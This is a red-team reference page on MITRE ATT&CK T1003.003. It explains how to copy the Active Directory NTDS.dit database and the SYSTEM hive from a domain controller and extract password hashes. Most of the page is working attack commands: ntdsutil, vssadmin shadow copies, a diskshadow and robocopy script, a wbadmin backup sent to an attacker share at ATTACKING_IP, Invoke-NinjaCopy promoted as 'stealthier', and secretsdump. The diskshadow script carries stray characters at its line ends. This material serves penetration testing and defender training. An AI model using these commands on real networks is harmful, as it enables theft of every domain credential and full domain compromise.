---
description: MITRE ATT&CK™ Sub-technique T1003.003
---

# NTDS secrets

NTDS (Windows NT Directory Services) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The NTDS.dit file is a database that stores the Active Directory data (including users, groups, security descriptors and password hashes). This file is stored on the domain controllers.

Once the secrets are extracted, they can be used for various attacks: [credential spraying](../bruteforcing/password-spraying.md), [stuffing](../bruteforcing/stuffing.md), [shuffling](../credential-shuffling.md), [cracking](../cracking.md), [pass-the-hash](../../ntlm/pth.md), [overpass-the-hash](../../kerberos/ptk.md) or [silver or golden tickets](../../kerberos/forged-tickets.md).

## Exfiltration

Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file. In order to exfiltrate it from a live domain controller and extract password hashes from it, many techniques can be used.

Just like with [SAM & LSA secrets](sam-and-lsa-secrets.md), the SYSTEM registry hive contains enough info to decrypt the NTDS.dit data. The hive file (`\system32\config\system`) can either be exfiltrated the same way the NTDS.dit file is, or it can be exported with `reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'`.

### AD maintenance (NTDSUtil)

NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to `C:\Windows\Temp`.

```bash
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```

The following files can then be exported

* `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
* `C:\Windows\Temp\NTDS\registry\SYSTEM`

### Volume Shadow Copy (VSSAdmin)

VSS (Volume Shadow Copy) is a Microsoft Windows technology, implemented as a service, that allows the creation of backup copies of files or volumes, even when they are in use. The following command will create the shadow copy and will print two values that will be used later: the ID and the Name of the shadow copy.

```bash
vssadmin create shadow /for=C:
```

Once the VSS is created for the target drive, it is then possible to copy the target files from it.

```bash
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save
```

Once the required files are exfiltrated, the shadow copy can be removed

```bash
vssadmin delete shadows /shadow=$ShadowCopyId
```

{% hint style="info" %}
This attack can be carried out with [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) with the `-use-vss` option. Additionaly, the `-exec-method` option can be set to `smbexec`, `wmiexec` or `mmcexec` to specify on which remote command execution method to rely on for the process.
{% endhint %}

### Disk shadow + Robocopy
We can achieve copy of NTDS file by using diskshadow in script mode.

copyScript.txt
```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

We then run the script and use robocopy to retreive the ntds.dit file
```
#Run the script
diskshadow /s copyScript.txt

#Exfiltrate ntds.dit of the new E: drive
robocopy /b E:\Windows\ntds . ntds.dit

#Get the SYSTEM hive for the bootKey
reg save hklm\system c:\temp\system

```

### Wbadmin Utility
Wbadmin is an elevated command prompt that allows administrators or backup operators to backup and restores an operating system (OS), volume, files, folders, or applications - [techtarget](https://www.techtarget.com/searchwindowsserver/definition/wbadmin)
However, Wbadmin required the remote shared folder to be formated with NTFS. So we have to mount an NTFS partition to retrieve the backup on our remote Linux server. The Impacket smbserver script does not handle this file system well, so we have to go directly through the smb deamon.  

On our Linux, we start by mounting an NTFS partition
```
#Create 2Mb ntfs file
dd if=/dev/zero of=ntfs.disk bs=1024M count=2 

#Run losetup
sudo losetup -fP ntfs.disk
losetup -a

#Replace loop0 by the losetup -a output
sudo mkfs.ntfs /dev/loop0

#mount it
sudo mount /dev/loop0 smbFolder/
```  
  
We then have to edit the `/etc/samba/smb.conf` file by adding a new share
```
# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
[myNewShare]
   comment = For NTDS dump
   path = /home/v4resk/Documents/RedTeam/CTF/HTB/Blackfield/smbFolder
   browseable = yes
   read only = no
   guest ok = yes
```

Restart smbd
```
sudo systemctl restart smbd 
```

We can now, on the Windows target, make a backup to our remote shared folder.
```
#Backup
wbadmin start backup -quiet -backuptarget:\\ATTACKING_IP\myNewShare -include:c:\windows\ntds

#Retrieve version of the backup
wbadmin get versions

#Extract ntds.dit of the backup (We can set 'recoverytarget' to a remote share by mounting it with net use)
wbadmin start recovery -quiet -version:03/26/2023-20:38 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\temp -notrestoreacl

#Get the SYSTEM hive for the bootKey
reg save hklm\system c:\temp\system.save

``` 


### NTFS structure parsing

[Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) is a PowerShell script part of the PowerSploit suite able to "copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. **This technique is stealthier than the others**.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
```

## Secrets dump

Once the required files are exfiltrated, they can be parsed by tools like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python, part of [Impacket](https://github.com/SecureAuthCorp/impacket/)) or [gosecretsdump](https://github.com/c-sto/gosecretsdump) (Go, faster for big files).

```
secretsdump -ntds ntds.dit.save -system system.save LOCAL
gosecretsdump -ntds ntds.dit.save -system system.save
```
